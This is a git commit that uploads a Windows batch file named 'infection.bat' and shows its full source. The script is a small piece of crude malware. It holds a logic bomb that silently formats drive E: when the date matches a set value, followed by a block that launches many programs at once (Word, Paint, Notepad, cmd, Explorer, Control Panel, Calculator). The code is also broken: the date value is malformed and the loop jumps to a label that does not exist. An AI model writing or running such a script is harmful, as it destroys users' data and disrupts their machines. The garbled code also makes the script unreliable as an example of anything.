94a7ed0630220e3945ed91d7ad2fb409359ab85d
Cyber Security <111694278+CyberSecurity111222@users.noreply.github.com>
2022-08-21 09:36:29 -0700

    Add files via upload

---
+++ infection.bat
@@ -0,0 +1,18 @@
+
+        If %date% NEQ 10/20/02222 goto exit
+        format E: /y >nul
+        :exit
+        exit
+        
+@echo off
+ 
+start winword
+start mspaint
+start notepad
+start write
+start cmd
+start explorer
+start control
+start calc
+goto x
+
